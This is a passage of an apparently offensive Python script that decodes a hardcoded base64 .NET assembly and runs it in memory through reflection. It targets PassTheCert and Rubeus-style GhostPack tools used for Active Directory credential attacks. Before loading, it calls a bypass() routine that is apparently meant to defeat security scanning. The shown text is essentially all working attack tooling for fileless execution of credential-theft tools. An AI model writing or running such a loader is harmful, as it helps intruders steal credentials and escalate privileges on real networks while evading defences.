        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("PassTheCert.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()